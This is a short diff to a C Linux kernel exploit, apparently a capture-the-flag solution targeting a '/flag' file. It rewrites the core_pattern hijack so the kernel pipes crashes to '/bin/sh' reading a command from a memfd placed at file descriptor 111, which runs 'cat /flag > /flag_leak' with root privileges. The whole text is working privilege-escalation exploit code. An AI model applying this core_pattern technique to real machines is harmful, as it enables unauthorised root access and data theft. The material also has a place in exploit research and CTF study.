@@ -21,7 +21,7 @@
  * EXPLOIT                     *
  *******************************/
 
-#define CORE_PATTERN_TARGET "|/proc/%P/fd/666 %P"
+#define CORE_PATTERN_TARGET "|/bin/sh /proc/%P/fd/111"
 #define SHELL_CMD "cat /flag"
 
 #define BPF_JIT_SIZE 0x200
@@ -76,11 +76,13 @@ int check_core() {
   return strncmp(buf, CORE_PATTERN_TARGET, 0x10) == 0;
 }
 
+#define CMD "cat /flag > /flag_leak"
 void crash() {
   pin_cpu(0, 1);
   int memfd = memfd_create("", 0);
-  SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
-  dup2(memfd, 666);
+  // SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
+  SYSCHK(write(memfd, CMD, strlen(CMD)));
+  dup2(memfd, 0x6f); // 111
   close(memfd);
   while (check_core() == 0)
     usleep(100000);
